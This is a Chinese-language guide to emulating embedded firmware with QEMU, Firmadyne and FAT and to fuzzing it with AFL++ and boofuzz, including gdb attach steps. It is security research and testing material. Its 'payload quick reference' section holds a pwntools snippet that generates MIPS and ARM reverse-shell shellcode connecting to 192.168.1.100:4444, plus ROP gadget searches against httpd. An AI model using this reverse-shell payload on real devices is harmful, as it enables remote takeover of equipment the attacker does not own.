# 仿真与模糊测试

参考：
- Firmadyne https://github.com/firmadyne/firmadyne
- FAT https://github.com/attify/firmware-analysis-toolkit
- AFL++ https://github.com/AFLplusplus/AFLplusplus

## 仿真三档

| 档位 | 工具 | 适用 | 难度 |
|------|------|------|------|
| 用户态 | qemu-*-static + chroot | 单个二进制（httpd / cgibin） | 低 |
| 全系统 | Firmadyne / FAT | 整个固件起 init / 网络栈 / NVRAM | 中 |
| 半真机 | qemu + 真硬件 GPIO / 协处理器透传 | 涉及外设的固件 | 高 |
| 纯真机 | UART / JTAG | 仿真起不来，必须上硬件 | 高 |

选择策略：

```text
只想看 httpd 接口        → 用户态
想真实跑起来管理界面     → 全系统
仿真起不来某外设         → 半真机或硬件
不在意效率追求真实       → 真机
```

## 用户态仿真（QEMU User Mode）

最快路径，几条命令出 shell。

```bash
# 1. 把 qemu-user-static 拷进 rootfs
cp /usr/bin/qemu-mipsel-static squashfs-root/usr/bin/

# 2. chroot 进去
sudo chroot squashfs-root /usr/bin/qemu-mipsel-static /bin/sh

# 3. 直接跑目标 binary
sudo chroot squashfs-root /usr/bin/qemu-mipsel-static /usr/sbin/httpd

# 4. 不 chroot 直接跑（路径相对）
qemu-mipsel-static -L squashfs-root/ squashfs-root/usr/sbin/httpd
```

架构对照表：

| 固件架构 | qemu binary |
|---------|-------------|
| MIPS little-endian (MT 系列) | qemu-mipsel-static |
| MIPS big-endian (BCM 系列) | qemu-mips-static |
| ARM little-endian (大多数) | qemu-arm-static |
| ARM 64 | qemu-aarch64-static |
| PowerPC | qemu-ppc-static |
| SuperH | qemu-sh4-static |

判断架构：

```bash
file squashfs-root/bin/busybox
# 输出例：ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV)
#        LSB = mipsel, MSB = mipseb
```

### 用户态的坑

- **`/proc` 不可用** → `mount -t proc proc squashfs-root/proc`
- **缺设备节点** → `mknod squashfs-root/dev/null c 1 3`
- **DNS 解析失败** → 拷一份 `/etc/resolv.conf` 进去
- **网络监听** → qemu-user 对网络栈支持有限，bind 高端口能成，低端口可能要 root
- **nvram_get 拿不到值** → 用户态没 NVRAM，httpd 经常崩；上全系统仿真

## 全系统仿真（Firmadyne）

完整流程：提取 → 识别架构 → 构造 image → 启动 + NVRAM hack。

### 安装

```bash
git clone --recursive https://github.com/firmadyne/firmadyne.git ~/tools/firmadyne
cd ~/tools/firmadyne
sudo ./download.sh             # 下载预编译内核

# 配置 PostgreSQL
sudo -u postgres createuser -P firmadyne   # 密码 firmadyne
sudo -u postgres createdb -O firmadyne firmware
sudo -u postgres psql -d firmware < ./database/schema
```

### 完整流程

```bash
cd ~/tools/firmadyne
FW=/path/to/firmware.bin

# Step 1: 注册固件到数据库
./sources/extractor/extractor.py -b TPLink -sql 127.0.0.1 -np -nk \
  "$FW" images

# Step 2: 识别架构
IID=$(psql -d firmware -U firmadyne -c "SELECT id FROM image \
  ORDER BY id DESC LIMIT 1;" -t | tr -d ' ')
./scripts/getArch.sh "./images/${IID}.tar.gz"

# Step 3: 把内核 + rootfs 装配成可启动 image
./scripts/tar2db.py -i "$IID" -f "./images/${IID}.tar.gz"
sudo ./scripts/makeImage.sh "$IID"

# Step 4: 推断网络配置（DHCP / 静态 IP）
./scripts/inferNetwork.sh "$IID"

# Step 5: 启动
./scratch/${IID}/run.sh
```

启动后会输出仿真 IP，浏览器访问：

```bash
# 假设输出 192.168.0.1
curl -I http://192.168.0.1/
nmap -p- 192.168.0.1
```

### NVRAM hack

Firmadyne 自带 `libnvram.so`，hook 所有 nvram 读取调用，返回默认值。

```bash
# 查看 libnvram 默认值表
cat ~/tools/firmadyne/nvram_files/nvram.default

# 加自定义 NVRAM 项（针对崩在特定 nvram_get 的服务）
echo "wan_ipaddr=192.168.0.100" >> ~/tools/firmadyne/nvram_files/nvram.default
echo "lan_ifname=br0"            >> ~/tools/firmadyne/nvram_files/nvram.default

# 重新打包 image
sudo ./scripts/makeImage.sh "$IID"
```

### 常见坑

| 现象 | 原因 | 修法 |
|------|------|------|
| 启动卡在 "init started" | 缺 /dev 节点 | `MAKEDEV` 在镜像里手工建 |
| httpd 启动即崩 | nvram_get 缺值 | 加 nvram.default |
| bind 错网卡 | inferNetwork 推错 | 手工改 `./scratch/${IID}/run.sh` 的 `-net nic` |
| IPC 信号量错 | 内核版本不匹配 | 换 Firmadyne 自带的对应架构内核 |
| 内核 panic | 架构识别错 | 重跑 getArch.sh，或手工指定 |
| 没网卡 | 固件没自动 ifconfig | 进仿真 shell `ifconfig br0 192.168.0.1 up` |
| 串口卡死 | tty 未分配 | `run.sh` 加 `-serial mon:stdio` |

## FAT（Firmware Analysis Toolkit）

Firmadyne 的封装，一行启动。

```bash
git clone https://github.com/attify/firmware-analysis-toolkit.git ~/tools/fat
cd ~/tools/fat
sudo pip3 install -r requirements.txt

# 编辑 fat.config 指向 Firmadyne 路径
vim fat.config

# 跑
sudo ./fat.py /path/to/firmware.bin
```

FAT 自动做完 extractor → getArch → makeImage → inferNetwork → run，一条命令到仿真 shell。

适合快速验证；遇到坑还是回到 Firmadyne 手工流程。

## 仿真态做 AFL++ Fuzz

### 三种模式选哪个

| 模式 | 速度 | 适用 |
|------|------|------|
| 源码编译 (afl-clang-lto) | 最快 | 有源码或能自行编译 |
| QEMU mode (-Q) | 慢 5-10 倍 | 仅有目标 binary |
| Persistent mode | 比 QEMU 快 5-10 倍 | 需要简单 harness 改造 |

### AFL++ QEMU mode（对仿真二进制 fuzz）

```bash
# 1. 准备 AFL++ qemu 后端（架构对应）
cd ~/tools/aflpp/qemu_mode
CPU_TARGET=mipsel ./build_qemu_support.sh

# 2. 准备种子语料
mkdir -p in/
echo "GET / HTTP/1.0" > in/seed1

# 3. 启动 fuzz
afl-fuzz -Q -i in/ -o out/ -- \
  qemu-mipsel-static -L squashfs-root/ \
  squashfs-root/usr/sbin/httpd

# 4. 监控覆盖率
afl-whatsup out/
```

### Persistent mode（速度 10x）

```c
// harness.c：把目标主循环改造为 input-driven
#include <stdio.h>
__AFL_FUZZ_INIT();

int main() {
    __AFL_INIT();
    unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;
    while (__AFL_LOOP(10000)) {
        int len = __AFL_FUZZ_TESTCASE_LEN;
        process_request(buf, len);   // 目标函数
    }
}
```

```bash
afl-clang-lto -o harness harness.c target.c
afl-fuzz -i in/ -o out/ -- ./harness
```

### afl-clang-lto 重编译（有源码）

```bash
# 源码 in tree
export CC=afl-clang-lto CXX=afl-clang-lto++
export AFL_USE_ASAN=1
make clean && make
afl-fuzz -i in/ -o out/ -- ./target @@
```

## 网络服务 fuzz：boofuzz

针对自定义二进制协议或仿真起来的服务。

```bash
pip3 install boofuzz
```

```python
# fuzz_httpd.py
from boofuzz import *

session = Session(target=Target(connection=TCPSocketConnection("192.168.0.1", 80)))

s_initialize(name="http_get")
s_string("GET", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("/", fuzzable=True)
s_string(" HTTP/1.0\r\n", fuzzable=False)
s_string("Host: 192.168.0.1\r\n", fuzzable=True)
s_string("\r\n", fuzzable=False)

session.connect(s_get("http_get"))
session.fuzz()
```

```bash
sudo python3 fuzz_httpd.py
# 配合 ./scratch/${IID}/run.sh 监控 console，看 crash
```

## ARM / MIPS payload 速查

```bash
# pwntools 生成 reverse shell
python3 - <<'EOF'
from pwn import *

# MIPS little-endian
context.clear(arch='mips', endian='little', os='linux')
sc = shellcraft.connect('192.168.1.100', 4444) + shellcraft.dupsh()
print(asm(sc).hex())

# ARM little-endian
context.clear(arch='arm', endian='little', os='linux')
sc = shellcraft.connect('192.168.1.100', 4444) + shellcraft.dupsh()
print(asm(sc).hex())
EOF

# ROP gadget 搜索
ropper --file ./httpd --search "system"
ROPgadget --binary ./httpd --only "pop|ret"
```

## 调试器接入

```bash
# 用户态 + gdbserver 模式
qemu-mipsel-static -g 1234 -L squashfs-root/ ./vuln_binary

# 另一终端
gdb-multiarch ./vuln_binary
(gdb) set architecture mips
(gdb) target remote :1234
(gdb) b *0x00401234
(gdb) c

# 全系统仿真接 gdb
# 改 ./scratch/${IID}/run.sh，qemu-system-mips 加参数：
#   -s -S
# 然后
gdb-multiarch
(gdb) target remote :1234
```

## 一键 fuzz 工作流

```bash
#!/bin/bash
FW=$1
IID=$2

# 1. 仿真起来
~/tools/fat/fat.py "$FW" &
sleep 30

# 2. 拿到 IP
IP=$(grep "br0" ~/tools/firmadyne/scratch/$IID/qemu.final.serial.log | head -1)

# 3. 网络 fuzz
python3 fuzz_httpd.py "$IP"

# 4. 同时 AFL++ 跑用户态
afl-fuzz -Q -i in/ -o out/ -- \
  qemu-mipsel-static -L squashfs-root/ squashfs-root/usr/sbin/httpd &

wait
```

## 引用

- Firmadyne: https://github.com/firmadyne/firmadyne
- FAT: https://github.com/attify/firmware-analysis-toolkit
- AFL++: https://github.com/AFLplusplus/AFLplusplus
- boofuzz: https://github.com/jtpereyda/boofuzz
- pwntools: https://github.com/Gallopsled/pwntools
